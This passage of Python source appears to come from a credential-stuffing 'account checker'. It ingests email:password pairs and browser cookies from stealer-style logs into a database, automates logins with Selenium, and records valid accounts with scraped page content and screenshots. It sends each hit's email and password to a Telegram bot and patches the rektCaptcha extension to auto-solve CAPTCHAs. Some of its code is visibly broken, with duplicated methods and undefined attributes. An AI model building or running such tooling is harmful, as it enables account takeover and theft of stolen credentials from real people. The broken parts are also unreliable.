                else:
                    email, pwd = item
                    cp = None
            else:
                email = item.get("email", "")
                pwd   = item.get("password", "")
                cp    = item.get("cookie_path")

            if not email or not pwd:
                continue

            ins_batch.append((email, pwd, cp))
            if cp:
                upd_batch.append((cp, email, pwd))
            if len(ins_batch) >= BATCH:
                cur.executemany(
                    "INSERT OR IGNORE INTO accounts (email, password, cookie_path, checked) VALUES (?, ?, ?, 0)",
                    ins_batch,
                )
                inserted_new += cur.rowcount
                if upd_batch:
                    cur.executemany(
                        "UPDATE accounts SET cookie_path=? WHERE email=? AND password=? "
                        "AND (cookie_path IS NULL OR cookie_path='')",
                        upd_batch,
                    )
                    updated_existing += cur.rowcount
                conn.commit()
                ins_batch.clear()
                upd_batch.clear()
        if ins_batch:
            cur.executemany(
                "INSERT OR IGNORE INTO accounts (email, password, cookie_path, checked) VALUES (?, ?, ?, 0)",
                ins_batch,
            )
            inserted_new += cur.rowcount
            if upd_batch:
                cur.executemany(
                    "UPDATE accounts SET cookie_path=? WHERE email=? AND password=? "
                    "AND (cookie_path IS NULL OR cookie_path='')",
                    upd_batch,
                )
                updated_existing += cur.rowcount
            conn.commit()
        conn.close()
    except sqlite3.DatabaseError as e:
        if "malformed" in str(e).lower() or "corrupt" in str(e).lower():
            _handle_db_corruption(db_name)
            setup_database(db_name)
        else:
            print_action(f"{Fore.RED}[DB Batch Error] {e}{Style.RESET_ALL}")
    except Exception as e:
        print_action(f"{Fore.RED}[DB Batch Error] Unexpected: {e}{Style.RESET_ALL}")
    return (inserted_new, updated_existing)


# Legacy shim
def populate_db_from_log_scan(pairs: list, db_name: str) -> int:
    inserted, _ = populate_db_from_log_scan_batch(pairs, db_name)
    return inserted


# --------------- Multi-Source Modal Dialog ------------------------------------

class LogIngestionDialog(tk.Toplevel):
    """Multi-source log ingestion modal with real-time progress tracking.

    Add multiple folders AND files. Runs parallel scan via scan_sources_parallel.
    Imports results via populate_db_from_log_scan_batch.
    """

    _N_WORKERS_DEFAULT: int = min(os.cpu_count() or 4, 8)

    def __init__(self, parent, _db_name: str, status_label, _colors: dict):
        super().__init__(parent)
        self.title("Log Ingestion Engine - Universal Multi-Source Scanner")
        self.resizable(True, True)
        self.grab_set()
        self.transient(parent)
        self.protocol("WM_DELETE_WINDOW", self._on_cancel)
        self._db_name      = _db_name
        self._status_label = status_label
        self._colors       = _colors
        self._sources: list     = []
        self._scan_results: list = []
        self._cancel_event = threading.Event()
        self._scan_complete = False
        self._scan_lock    = threading.Lock()
        self._stat_found   = tk.IntVar(value=0)
        self._stat_errors  = tk.IntVar(value=0)
        self._stat_skipped = tk.IntVar(value=0)
        self._stat_current = tk.StringVar(value="")
        self._build_ui()
        self.update_idletasks()
        pw, ph = parent.winfo_width(), parent.winfo_height()
        px, py = parent.winfo_rootx(), parent.winfo_rooty()
        dw, dh = 760, 640
        self.geometry(f"{dw}x{dh}+{px + max(0,(pw-dw)//2)}+{py + max(0,(ph-dh)//2)}")
        self.minsize(640, 520)

    def _build_ui(self):
        clr = self._colors
        self.configure(bg=clr["bg"])
        tk.Label(self, text="Log Ingestion Engine - Universal Multi-Source Scanner",
                 bg=clr["bg"], fg=clr["accent"], font=("Inter", 12, "bold"),
                 ).pack(padx=15, pady=(14, 2), anchor="w")
        tk.Label(self,
                 text="Formats: email:pass, login:pass, URL/Login/Password blocks, "
                      "tab/pipe-separated,\nJSON cookies, Netscape cookies, SQLite cookie databases.",
                 bg=clr["bg"], fg=clr["fg_sub"], font=("Inter", 8), justify="left",
                 ).pack(padx=15, anchor="w")
        ttk.Separator(self, orient="horizontal").pack(fill="x", padx=10, pady=7)

        # Sources
        frm_src = ttk.LabelFrame(self, text="  Sources  ")
        frm_src.pack(padx=15, pady=3, fill="x")
        frm_sb = ttk.Frame(frm_src)
        frm_sb.pack(padx=8, pady=5, anchor="w")
        ttk.Button(frm_sb, text="+ Add Folder",  command=self._add_folder).pack(side="left", padx=2)
        ttk.Button(frm_sb, text="+ Add File(s)", command=self._add_files).pack(side="left", padx=2)
        ttk.Button(frm_sb, text="Remove Sel.",   command=self._remove_sel).pack(side="left", padx=2)
        ttk.Button(frm_sb, text="Clear All",     command=self._clear_all).pack(side="left", padx=2)
        frm_lb = ttk.Frame(frm_src)
        frm_lb.pack(padx=8, pady=(0, 8), fill="x")
        self._lb = tk.Listbox(frm_lb, height=5, bg=clr["surface"], fg=clr["fg"],
                              selectmode=tk.EXTENDED, font=("Consolas", 9),
                              activestyle="dotbox", relief="flat", bd=0)
        self._lb.pack(side="left", fill="x", expand=True)
        _sb = ttk.Scrollbar(frm_lb, orient="vertical", command=self._lb.yview)
        _sb.pack(side="right", fill="y")
        self._lb.configure(yscrollcommand=_sb.set)

        # Options
        ttk.Separator(self, orient="horizontal").pack(fill="x", padx=10, pady=4)
        frm_opts = ttk.Frame(self)
        frm_opts.pack(padx=15, pady=4, fill="x")
        ttk.Label(frm_opts, text="Workers:").grid(row=0, column=0, padx=(0, 4), sticky="e")
        self._var_workers = tk.IntVar(value=self._N_WORKERS_DEFAULT)
        ttk.Spinbox(frm_opts, from_=1, to=32, textvariable=self._var_workers, width=5).grid(row=0, column=1, padx=(0, 10), sticky="w")
        ttk.Label(frm_opts, text="Max Depth:").grid(row=0, column=2, padx=(0, 4), sticky="e")
        self._var_depth = tk.StringVar(value="unlimited")
        ttk.Spinbox(frm_opts, values=["unlimited"] + [str(i) for i in range(1, 101)],
                    textvariable=self._var_depth, width=8).grid(row=0, column=3, padx=(0, 10), sticky="w")
        ttk.Label(frm_opts, text="Encoding:").grid(row=0, column=4, padx=(0, 4), sticky="e")
        self._var_encoding = tk.StringVar(value="auto")
        ttk.OptionMenu(frm_opts, self._var_encoding,
                       "auto", "auto", "utf-8", "utf-16", "latin-1", "cp1252",
                       ).grid(row=0, column=5, sticky="w")

        # Progress
        ttk.Separator(self, orient="horizontal").pack(fill="x", padx=10, pady=4)
        frm_prog = ttk.Frame(self)
        frm_prog.pack(padx=15, pady=3, fill="x")
        self._pb = ttk.Progressbar(frm_prog, orient="horizontal", mode="indeterminate", length=700)
        self._pb.pack(fill="x", pady=(0, 4))
        self._lbl_pbt = ttk.Label(frm_prog, text="Ready - press 'Start Scan' to begin.")
        self._lbl_pbt.pack(anchor="w")

        frm_stats = ttk.Frame(self)
        frm_stats.pack(padx=15, pady=2, fill="x")
        for col, (lbl, var, color) in enumerate([
            ("Found:",   self._stat_found,   "#00adb5"),
            ("Errors:",  self._stat_errors,   "orange"),
            ("Skipped:", self._stat_skipped,  "gray"),
        ]):
            ttk.Label(frm_stats, text=lbl).grid(row=0, column=col*2,   padx=(8,2), sticky="e")
            ttk.Label(frm_stats, textvariable=var, foreground=color,
                      font=("Inter", 10, "bold")).grid(row=0, column=col*2+1, padx=(0,12), sticky="w")

        ttk.Label(self, textvariable=self._stat_current, foreground=clr["fg_sub"],
                  font=("Consolas", 8), wraplength=720).pack(padx=15, anchor="w")

        frm_log = ttk.LabelFrame(self, text="  Scan Log  ")
        frm_log.pack(padx=15, pady=5, fill="both", expand=True)
        self._log_text = tk.Text(frm_log, height=8, bg=clr["surface"], fg=clr["fg"],
                                font=("Consolas", 9), wrap="none", state="disabled")
        _sb2 = ttk.Scrollbar(frm_log, orient="vertical", command=self._log_text.yview)
        _sb2.pack(side="right", fill="y")
        self._log_text.pack(side="left", fill="both", expand=True)
        self._log_text.configure(yscrollcommand=_sb2.set)

        ttk.Separator(self, orient="horizontal").pack(fill="x", padx=10, pady=7)
        frm_btns = ttk.Frame(self)
        frm_btns.pack(padx=15, pady=(0, 14), fill="x")
        self._btn_cancel = ttk.Button(frm_btns, text="Cancel",      command=self._on_cancel)
        self._btn_cancel.pack(side="left",  padx=5)
        self._btn_scan   = ttk.Button(frm_btns, text="Start Scan",  command=self._start_scan)
        self._btn_scan.pack(side="right", padx=5)
        self._btn_import = ttk.Button(frm_btns, text="Import to DB", command=self._import_to_db, state="disabled")
        self._btn_import.pack(side="right", padx=5)

    def _add_folder(self):
        p = filedialog.askdirectory(title="Select Source Folder", parent=self, initialdir=os.getcwd())
        if p and p not in self._sources:
            self._sources.append(p)
            self._lb.insert(tk.END, p)


    def _add_structured_file(self):
        fpaths = filedialog.askopenfilenames(
            title="Select Structured Files (CSV, JSON, TXT)",
            filetypes=(("Structured files", "*.csv;*.json;*.txt"), ("All files", "*.*"))
        )
        if not fpaths:
            return

        for p in fpaths:
            if p not in self._sources:
                self._sources.append(p)
                self._lb.insert(tk.END, f"📄 {p}")

    def _add_files(self):
        fpaths = filedialog.askopenfilenames(
            title="Select Text Files",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        if not fpaths:
            return
        added = 0
        for p in fpaths:
            if p not in self.selected_sources:
                self.selected_sources.append(p)
                self.source_listbox.insert(tk.END, f"📄 {p}")
                added += 1
        self._log(f"Added {added} files.")

    def _add_structured_file(self):
        fpaths = filedialog.askopenfilenames(
            title="Select Structured Files (CSV, JSON, TXT)",
            filetypes=(("Structured files", "*.csv;*.json;*.txt"), ("All files", "*.*"))
        )
        if not fpaths:
            return

        added = 0
        for p in fpaths:
            if p not in self.selected_sources:
                self.selected_sources.append(p)
                self.source_listbox.insert(tk.END, f"📄 {p}")
                added += 1
        self._log(f"Added {added} structured files.")

        # Override the worker logic to explicitly parse these formats later if needed
        # Since _scan_flat_cred_file handles txt, we will patch it to handle json and csv


        paths = filedialog.askopenfilenames(title="Select Credential File(s)", parent=self,
                                            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        for p in paths:
            if p not in self._sources:
                self._sources.append(p)
                self._lb.insert(tk.END, p)

    def _remove_sel(self):
        for i in reversed(self._lb.curselection()):
            self._lb.delete(i)
            del self._sources[i]

    def _clear_all(self):
        self._sources.clear()
        self._lb.delete(0, tk.END)

    def _log(self, msg: str):
        def _a():
            try:
                self._log_text.configure(state="normal")
                self._log_text.insert(tk.END, msg + "\n")
                self._log_text.see(tk.END)
                self._log_text.configure(state="disabled")
            except Exception:
                pass
        try:
            self.after(0, _a)
        except Exception:
            pass

    def _update_stats(self, found_delta=0, error_delta=0, skipped_delta=0, current_path=""):
        def _a():
            try:
                if found_delta:
                    self._stat_found.set(self._stat_found.get() + found_delta)
                if error_delta:
                    self._stat_errors.set(self._stat_errors.get() + error_delta)
                if skipped_delta:
                    self._stat_skipped.set(self._stat_skipped.get() + skipped_delta)
                if current_path:
                    d = current_path if len(current_path) <= 95 else "..." + current_path[-92:]
                    self._stat_current.set(f"Scanning: {d}")
            except Exception:
                pass
        try:
            self.after(0, _a)
        except Exception:
            pass

    def _start_scan(self):
        if not self._sources:
            messagebox.showwarning("No Sources", "Add at least one folder or file.", parent=self)
            return
        self._cancel_event.clear()
        self._scan_results.clear()
        self._scan_complete = False
        self._stat_found.set(0)
        self._stat_errors.set(0)
        self._stat_skipped.set(0)
        self._stat_current.set("")
        self._log_text.configure(state="normal")
        self._log_text.delete("1.0", tk.END)
        self._log_text.configure(state="disabled")
        self._btn_scan.configure(state="disabled")
        self._btn_import.configure(state="disabled")
        self._pb.configure(mode="indeterminate")
        self._pb.start(10)
        self._lbl_pbt.configure(text=f"Scanning {len(self._sources)} source(s) - please wait...")

        workers  = max(1, min(self._var_workers.get(), 32))
        ds       = self._var_depth.get()
        max_d    = None if ds == "unlimited" else int(ds)
        enc      = self._var_encoding.get()
        srcs     = list(self._sources)

        def _worker():
            try:
                results = scan_sources_parallel(
                    sources=srcs, workers=workers, max_depth=max_d,
                    encoding=enc, cancel_event=self._cancel_event,
                    log_callback=self._log, stat_callback=self._update_stats,
                )
                with self._scan_lock:
                    self._scan_results = results
                    self._scan_complete = True
                n = len(results)
                def _done(_n=n, _s=len(srcs)):
                    try:
                        self._pb.stop()
                        self._pb.configure(mode="determinate", value=100)
                        self._lbl_pbt.configure(
                            text=f"Scan complete: {_n} unique pair(s) across {_s} source(s).")
                        self._btn_scan.configure(state="normal")
                        if _n > 0:
                            self._btn_import.configure(state="normal")
                        self._stat_current.set("")
                        self._log(f"--- SCAN COMPLETE: {_n} pairs ---")
                    except Exception:
                        pass
                self.after(0, _done)
            except Exception as exc:
                err = str(exc)
                def _err(_e=err):
                    try:
                        self._pb.stop()
                        self._lbl_pbt.configure(text=f"Scan failed: {_e[:80]}")
                        self._btn_scan.configure(state="normal")
                        self._log(f"[FATAL] {_e}")
                    except Exception:
                        pass
                self.after(0, _err)

        threading.Thread(target=_worker, daemon=True).start()

    def _import_to_db(self):
        with self._scan_lock:
            if not self._scan_results:
                return
            snap = list(self._scan_results)
        self._btn_import.configure(state="disabled")
        self._lbl_pbt.configure(text="Importing into database...")

        def _db_worker():
            try:
                setup_database(self._db_name)
                inserted, updated = populate_db_from_log_scan_batch(snap, self._db_name)
                total = len(snap)
                summary = (
                    f"Import complete: {total} pairs, "
                    f"{inserted} new records inserted, "
                    f"{updated} existing records updated with cookie_path."
                )
                def _done(_s=summary, _snap=snap):
                    try:
                        self._lbl_pbt.configure(text=_s)
                    except Exception:
                        pass
                    try:
                        global _log_ingestion_pairs
                        _log_ingestion_pairs = _snap
                    except Exception:
                        pass
                    try:
                        if self._status_label:
                            self._status_label.configure(text=_s[:140], foreground="#00adb5")
                    except Exception:
                        pass
                    # ----------------------------------------------------------------
                    # POPULATE the Account Inputs text field so Check Accounts works
                    # immediately after import - without this step the import is useless.
                    # We write email:password pairs (one per line) using the global
                    # text_usernames_passwords widget that the main GUI created.
                    # ----------------------------------------------------------------
                    try:
                        lines = []
                        for p in _snap:
                            email = p.get("email") or ""
                            password = p.get("password") or ""
                            if not email or not password:
                                continue
                            cookie_path = p.get("cookie_path") or ""
                            cookie_path = cookie_path.strip() if cookie_path else ""
                            if cookie_path:
                                lines.append(f"{email}:{password}:{cookie_path}")
                            else:
                                lines.append(f"{email}:{password}")
                        if lines:
                            text_usernames_passwords.delete("1.0", "end")
                            text_usernames_passwords.insert("1.0", "\n".join(lines))
                    except Exception:
                        pass
                    messagebox.showinfo("Import Complete", _s, parent=self)
                    try:
                        self.destroy()
                    except Exception:
                        pass
                self.after(0, _done)
            except Exception as exc:
                err = str(exc)
                def _err(_e=err):
                    messagebox.showerror("Import Error", f"DB import failed:\n{_e}", parent=self)
                    self._btn_import.configure(state="normal")
                self.after(0, _err)

        threading.Thread(target=_db_worker, daemon=True).start()

    def _on_cancel(self):
        self._cancel_event.set()
        try:
            self._pb.stop()
        except Exception:
            pass
        try:
            self.destroy()
        except Exception:
            pass


# --------------- GUI Entry Point ----------------------------------------------

def gui_bulk_import_logs():
    """Opens the multi-source LogIngestionDialog modal."""
    try:
        _lbl = lbl_ingestion_status
    except NameError:
        _lbl = None
    try:
        _clr = colors
    except NameError:
        _clr = {"bg": "#0d1117", "surface": "#161b22", "accent": "#00adb5",
                "fg": "#e6edf3", "fg_sub": "#8b949e"}
    try:
        dialog = LogIngestionDialog(parent=window, _db_name=db_name, status_label=_lbl, _colors=_clr)
        window.wait_window(dialog)
    except Exception as e:
        messagebox.showerror("Log Ingestion Error", f"Failed to open dialog:\n{e}")





# Keys that are login-form interaction selectors, NOT post-login capture targets.
# They are expected to be absent on the success/redirect page, so we never try
# to read them as captured text after a successful login.
_LOGIN_SELECTOR_KEYS = frozenset({
    "email", "password", "next", "next_password",
    "submit", "captcha_image", "captcha_input", "captcha_submit",
})


def save_valid_account(email, password, results_folder, browser, capture_settings):
    """Saves valid account information and takes a screenshot."""
    # Save to valid_accounts.txt
    with open(os.path.join(results_folder, "valid_accounts.txt"), "a", encoding='utf-8') as f:
        f.write(f"{email}:{password}\n")

    # Capture additional info based on capture settings.
    # Only iterate user-defined capture selectors - never login-form selectors.
    captured_info = {}
    try:
        if capture_settings["css_selectors"]:
            for key, selector in capture_settings["css_selectors"].items():
                # Skip all login-interaction selectors - they don't exist on the
                # post-login page and would spam errors that confuse the user.
                if key in _LOGIN_SELECTOR_KEYS:
                    continue
                # Guard: selector must be a non-empty string
                if not selector or not isinstance(selector, str) or not selector.strip():
                    continue
                try:
                    element = browser.find_element(By.CSS_SELECTOR, selector.strip())
                    captured_info[key] = element.text.strip()
                except Exception:
                    # Element is absent on the success page - silently skip it.
                    # Do NOT log an error here; this is expected for optional selectors.
                    pass

        if capture_settings["inner_html_capture"]:
            try:
                captured_info["inner_html"] = browser.find_element(By.TAG_NAME, "body").get_attribute(
                    "innerHTML"
                )
            except Exception as e:
                captured_info["inner_html"] = "Not captured"
                print_action(f"{Fore.RED}Error capturing inner HTML: {e}{Style.RESET_ALL}")

        if capture_settings["outer_html_capture"]:
            try:
                captured_info["outer_html"] = browser.find_element(By.TAG_NAME, "body").get_attribute(
                    "outerHTML"
                )
            except Exception as e:
                captured_info["outer_html"] = "Not captured"
                print_action(f"{Fore.RED}Error capturing outer HTML: {e}{Style.RESET_ALL}")
    except Exception as e:
        print_action(
            f"{Fore.RED}Error capturing additional info for {email}: {e}{Style.RESET_ALL}"
        )

    # Save captured info
    with open(
        os.path.join(results_folder, "captured_information_valid_accounts.txt"),
        "a", encoding='utf-8'
    ) as f:
        f.write(f"Account: {email}\nPassword: {password}\n")
        for key, value in captured_info.items():
            f.write(f"{key.capitalize()}: {value}\n")
        f.write("\n")

    # Take screenshot if enabled
    if var_capture_screenshot.get():
        try:
            from PIL import ImageGrab
            screenshot_path = os.path.join(results_folder, f"{email}.png")
            screenshot = ImageGrab.grab()  # Capture the entire screen
            screenshot.save(screenshot_path)
            print_action(f"Screenshot saved to {screenshot_path}")
        except Exception as e:
            print_action(
                f"{Fore.RED}Failed to take screenshot for {email}: {e}{Style.RESET_ALL}"
            )
    else:
        print_action("Screenshot capture is disabled.")

    # Send captured details to Telegram
    telegram_settings = capture_settings.get("telegram", {})
    if telegram_settings.get("enabled"):
        bot_token = telegram_settings.get("bot_token")
        chat_id = telegram_settings.get("chat_id")
        if bot_token and chat_id:
            message_parts = [f"✅ Valid Account Found:\nEmail: {email}\nPassword: {password}\n"]
            for key, value in captured_info.items():
                if key.lower() in ['inner_html', 'outer_html']:
                    continue  # Exclude large content from Telegram message
                # Avoid including error messages
                if value not in ("Not found", "Not captured"):
                    message_parts.append(f"{key.capitalize()}: {value}\n")
            message = "".join(message_parts)
            # Ensure message length does not exceed Telegram's limit
            max_length = 4000  # Telegram limit is 4096 characters
            if len(message) > max_length:
                message = message[:max_length - 50] + "\n[Message truncated]"
            send_telegram_message(bot_token, chat_id, message)
        else:
            print_action(
                f"{Fore.RED}Telegram Bot Token or Chat ID not provided.{Style.RESET_ALL}"
            )


# -------------------
# Telegram Bot Functions
# -------------------
def send_telegram_message(bot_token, chat_id, message):
    """Sends a message to a Telegram bot."""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {"chat_id": chat_id, "text": message}
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print_action(
                f"{Fore.GREEN}Message sent to Telegram successfully.{Style.RESET_ALL}"
            )
        else:
            print_action(
                f"{Fore.RED}Failed to send message to Telegram: {response.text}{Style.RESET_ALL}"
            )
    except Exception as e:
        print_action(
            f"{Fore.RED}Error sending message to Telegram: {e}{Style.RESET_ALL}"
        )


# -------------------
# Browser Functions
# -------------------
# ─────────────────────────────────────────────────────────────────────────────
# PERMANENT EXTENSION LOADER  (self-healing, future-proof, 24/7 stable)
# ─────────────────────────────────────────────────────────────────────────────
# ROOT CAUSE of the recurring bug:
#   options.add_extension() stores data in options._extensions, NOT in
#   options._arguments.  browser_factory's attachment-mode (Chrome v140+)
#   only copies _arguments to the CLI, so every .crx payload is silently
#   dropped and extensions never load.
#
# PERMANENT FIX:
#   Unpack each .crx to a temp dir, inject via --load-extension=<dir>
# ─────────────────────────────────────────────────────────────────────────────

import tempfile
import zipfile as _zipfile

_EXT_UNPACK_ROOT: str = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "_ext_unpacked"
)


def _unpack_crx_to_dir(crx_path: str) -> str:
    """
    Unpacks a .crx file into a stable dir under _ext_unpacked/<stem>_<hash>/.
    Returns the dir path on success, empty string on failure.

    Three-tier parsing:
      Tier 1: CRX3 structured header  (magic=Cr24, version=3, proto_len at bytes 8-11)
              ZIP starts at offset 12+proto_len.
      Tier 2: Scan every PK\\x03\\x04 occurrence in the file and try ZipFile at each.
              Needed because CRX3 protobuf headers often embed false-positive PK magic.
      Tier 3: Try offset 0 (plain ZIP file with .crx extension).
    """
    import hashlib, io, struct, shutil as _sh
    try:
        stem = os.path.splitext(os.path.basename(crx_path))[0]
        try:
            mtime = os.path.getmtime(crx_path)
            size  = os.path.getsize(crx_path)
            hint  = f"{crx_path}_{mtime}_{size}"
        except Exception:
            hint = crx_path
        ph = hashlib.md5(hint.encode()).hexdigest()[:8]
        unpack_dir = os.path.join(_EXT_UNPACK_ROOT, f"{stem}_{ph}")

        if os.path.isfile(os.path.join(unpack_dir, "manifest.json")):
            print_action(f"{Fore.CYAN}[Extensions] Reusing unpacked: {os.path.basename(unpack_dir)}{Style.RESET_ALL}")
            try:
                import json as _json
                manifest_path = os.path.join(unpack_dir, "manifest.json")
                with open(manifest_path, "r", encoding="utf-8") as f:
                    mdata = _json.load(f)
                dirty = False
                if "update_url" in mdata:
                    del mdata["update_url"]
                    dirty = True
                

                    
                if dirty:
                    with open(manifest_path, "w", encoding="utf-8") as f:
                        _json.dump(mdata, f, indent=2)
                    print_action(f"{Fore.GREEN}[Extensions] Patched manifest in reused unpacked folder.{Style.RESET_ALL}")
            except Exception as e:
                print_action(f"{Fore.YELLOW}[Extensions] Warning patching reused manifest: {e}{Style.RESET_ALL}")
            _patch_rektcaptcha_defaults(unpack_dir, stem)
            return unpack_dir

        if os.path.isdir(unpack_dir):
            _sh.rmtree(unpack_dir, ignore_errors=True)
        os.makedirs(unpack_dir, exist_ok=True)

        with open(crx_path, "rb") as fh:
            raw = fh.read()

        def _attempt(offset):
            try:
                with _zipfile.ZipFile(io.BytesIO(raw[offset:])) as zf:
                    zf.extractall(unpack_dir)
                manifest_path = os.path.join(unpack_dir, "manifest.json")
                if os.path.isfile(manifest_path):
                    # Clean manifest of forbidden update_url
                    try:
                        import json as _json
                        with open(manifest_path, "r", encoding="utf-8") as f:
                            mdata = _json.load(f)
                        dirty = False
                        if "update_url" in mdata:
                            del mdata["update_url"]
                            dirty = True
                        

                            
                        if dirty:
                            with open(manifest_path, "w", encoding="utf-8") as f:
                                _json.dump(mdata, f, indent=2)
                    except Exception as me:
                        print_action(f"{Fore.YELLOW}[Extensions] Warning cleaning manifest: {me}{Style.RESET_ALL}")
                    
                    # Delete forbidden _metadata folder
                    metadata_dir = os.path.join(unpack_dir, "_metadata")
                    if os.path.isdir(metadata_dir):
                        try:
                            _sh.rmtree(metadata_dir, ignore_errors=True)
                        except Exception as mde:
                            print_action(f"{Fore.YELLOW}[Extensions] Warning deleting _metadata: {mde}{Style.RESET_ALL}")
                    
                    return True
            except Exception:
                pass
            _sh.rmtree(unpack_dir, ignore_errors=True)
            os.makedirs(unpack_dir, exist_ok=True)
            return False

        tried = set()

        # Tier 1
        if len(raw) >= 12 and raw[:4] == b"Cr24":
            ver = struct.unpack_from("<I", raw, 4)[0]
            if ver == 3:
                plen = struct.unpack_from("<I", raw, 8)[0]
                off = 12 + plen
                tried.add(off)
                if off < len(raw) and _attempt(off):
                    print_action(f"{Fore.GREEN}[Extensions] Unpacked (CRX3 header): {os.path.basename(crx_path)}{Style.RESET_ALL}")
                    _patch_rektcaptcha_defaults(unpack_dir, stem)
                    return unpack_dir

        # Tier 2
        pos = 0
        while True:
            idx = raw.find(b"PK\x03\x04", pos)
            if idx == -1:
                break
            if idx not in tried:
                tried.add(idx)
                if _attempt(idx):
                    print_action(f"{Fore.GREEN}[Extensions] Unpacked (PK@{idx}): {os.path.basename(crx_path)}{Style.RESET_ALL}")
                    _patch_rektcaptcha_defaults(unpack_dir, stem)
                    return unpack_dir
            pos = idx + 1

        # Tier 3
        if 0 not in tried and _attempt(0):
            print_action(f"{Fore.GREEN}[Extensions] Unpacked (plain ZIP): {os.path.basename(crx_path)}{Style.RESET_ALL}")
            _patch_rektcaptcha_defaults(unpack_dir, stem)
            return unpack_dir

        print_action(f"{Fore.RED}[Extensions] CRITICAL: Cannot unpack {os.path.basename(crx_path)} "
                     f"({len(tried)} offset(s) tried). File may be corrupted.{Style.RESET_ALL}")
        _sh.rmtree(unpack_dir, ignore_errors=True)
        return ""
    except Exception as ex:
        print_action(f"{Fore.RED}[Extensions] Failed to unpack {crx_path}: {ex}{Style.RESET_ALL}")
        return ""


def _patch_rektcaptcha_defaults(unpack_dir: str, stem: str) -> None:
    """
    Hard-patches rektCaptcha's background.js to set Auto-Open and Auto-Solve
    to TRUE by default, eliminating any dependency on CDP, WebSocket, or
    chrome.storage.local injection.

    The extension ships with minified JS::
        const e={recaptcha_auto_open:!1,recaptcha_auto_solve:!1,...}
    We replace !1 (false) with !0 (true) for both flags so they are ON
    from the very first run regardless of stored preferences.

    Only runs when the extension directory name or stem contains 'rektcaptcha'
    (case-insensitive) to avoid touching other extensions.
    """
    if "rektcaptcha" not in stem.lower():
        return
    bg_js = os.path.join(unpack_dir, "background.js")
    if not os.path.isfile(bg_js):
        return
    try:
        with open(bg_js, "r", encoding="utf-8") as f:
            src = f.read()
        patched = src.replace(
            "recaptcha_auto_open:!1,recaptcha_auto_solve:!1",
            "recaptcha_auto_open:!0,recaptcha_auto_solve:!0",
        )
        if patched == src:
            # Already patched or format changed — log and skip
            if "recaptcha_auto_open:!0" in src:
                print_action(
                    f"{Fore.CYAN}[rektCaptcha] Auto-Open/Auto-Solve already patched to ON.{Style.RESET_ALL}"
                )
            else:
                print_action(
                    f"{Fore.YELLOW}[rektCaptcha] WARNING: Could not find default flags in background.js — "
                    f"Auto-Open/Auto-Solve may remain OFF. Check manually.{Style.RESET_ALL}"
                )
            return
        with open(bg_js, "w", encoding="utf-8", newline="") as f:
            f.write(patched)
        print_action(
            f"{Fore.GREEN}[rektCaptcha] ✓ background.js patched: "
            f"Auto-Open=ON, Auto-Solve=ON (default true).{Style.RESET_ALL}"
        )
    except Exception as pe:
        print_action(
            f"{Fore.YELLOW}[rektCaptcha] Warning patching background.js defaults: {pe}{Style.RESET_ALL}"
        )



def load_chrome_extensions(options, return_dirs: bool = False):
    """
    Loads Chrome extensions from the chrome_extensions subfolder.

    Two-path strategy (both applied simultaneously for maximum compatibility):
      Path A — --load-extension=<unpacked_dir>  (ATTACHMENT-MODE safe, survives
               browser_factory's CLI arg extraction, works in Chrome v140+)
      Path B — options.add_extension(<crx_path>)  (legacy UC non-attachment path,
               kept as belt-and-suspenders fallback)

    Parameters
    ----------
    options      : uc.ChromeOptions object to inject into.
    return_dirs  : When True, returns list of unpacked extension directories
                   so the caller can also pass them to --load-extension directly.
    """
    extensions_path = locator.get_absolute_path("chrome_extensions")
    if not os.path.isdir(extensions_path):
        print_action(
            f"{Fore.YELLOW}[Extensions] chrome_extensions folder not found at: {extensions_path}.{Style.RESET_ALL}"
        )
        return [] if return_dirs else None

    crx_files = sorted([f for f in os.listdir(extensions_path) if f.lower().endswith(".crx")])
    # ── Also scan for already-unpacked extension subdirectories ────────────────
    # Any subdirectory of chrome_extensions/ that contains a manifest.json is
    # treated as a pre-unpacked extension and passed directly to --load-extension=.
    # This is the fallback when the CRX file is corrupted or uses an incompatible format.
    unpacked_subdirs = sorted([
        os.path.join(extensions_path, d)
        for d in os.listdir(extensions_path)
        if os.path.isdir(os.path.join(extensions_path, d))
        and os.path.isfile(os.path.join(extensions_path, d, "manifest.json"))
    ])

    if not crx_files and not unpacked_subdirs:
        print_action(f"{Fore.YELLOW}[Extensions] No .crx files or unpacked extension folders found in: {extensions_path}{Style.RESET_ALL}")
        return [] if return_dirs else None

    print_action(f"{Fore.CYAN}[Extensions] Found {len(crx_files)} CRX file(s) + {len(unpacked_subdirs)} unpacked dir(s) to load.{Style.RESET_ALL}")

    loaded_dirs: list = []
    already_load_ext_args: list = []

    # Collect existing --load-extension args so we can merge (not duplicate)
    _existing_args = []
    if hasattr(options, '_arguments'):
        _existing_args = list(options._arguments)
    elif hasattr(options, 'arguments'):
        _existing_args = list(options.arguments)
    for _a in _existing_args:
        if _a.startswith("--load-extension="):
            already_load_ext_args.extend(_a[len("--load-extension="):].split(","))

    # ── Process pre-unpacked subdirectories first (highest priority) ──────────
    for ext_dir in unpacked_subdirs:
        print_action(f"{Fore.GREEN}[Extensions] Using pre-unpacked dir: {os.path.basename(ext_dir)}{Style.RESET_ALL}")
        # Clean manifest and _metadata from pre-unpacked directories too!
        manifest_path = os.path.join(ext_dir, "manifest.json")
        if os.path.isfile(manifest_path):
            try:
                import json as _json
                with open(manifest_path, "r", encoding="utf-8") as f:
                    mdata = _json.load(f)
                dirty = False
                if "update_url" in mdata:
                    del mdata["update_url"]
                    dirty = True
                

                    
                if dirty:
                    with open(manifest_path, "w", encoding="utf-8") as f:
                        _json.dump(mdata, f, indent=2)
            except Exception as e:
                print_action(f"{Fore.YELLOW}[Extensions] Warning cleaning manifest in {os.path.basename(ext_dir)}: {e}{Style.RESET_ALL}")
        metadata_dir = os.path.join(ext_dir, "_metadata")
        if os.path.isdir(metadata_dir):
            try:
                import shutil as _sh
                _sh.rmtree(metadata_dir, ignore_errors=True)
            except Exception as e:
                print_action(f"{Fore.YELLOW}[Extensions] Warning deleting _metadata in {os.path.basename(ext_dir)}: {e}{Style.RESET_ALL}")
        loaded_dirs.append(ext_dir)

    # ── Process CRX files ──────────────────────────────────────────────────────
    for crx_name in crx_files:
        crx_path = os.path.join(extensions_path, crx_name)
        if not os.path.isfile(crx_path):
            print_action(f"{Fore.YELLOW}[Extensions] Skipping non-file entry: {crx_name}{Style.RESET_ALL}")
            continue

